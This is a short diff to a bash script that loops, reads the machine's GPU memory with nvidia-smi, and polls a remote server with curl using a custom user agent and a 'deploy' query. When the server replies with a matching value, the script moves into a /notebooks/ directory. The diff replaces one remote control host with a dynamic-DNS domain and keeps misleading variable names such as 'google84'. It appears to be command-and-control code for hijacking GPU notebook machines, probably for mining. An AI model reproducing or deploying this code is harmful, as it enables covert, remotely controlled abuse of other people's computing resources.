@@ -11,13 +11,13 @@ else
 while true
 do
 
-arr[0]="http://linuxdistro8474.atwebpages.com/"
+arr[0]="http://mobile84121274.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
 google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-string=$(curl -s -A "mobile84" http://linuxdistro8474.atwebpages.com/?q=deploy)
+string=$(curl -s -A "mobile84" http://mobile84121274.hopto.org/?q=deploy)
 if [[ $string == *"16384"* ]]; then
 
 cd /notebooks/
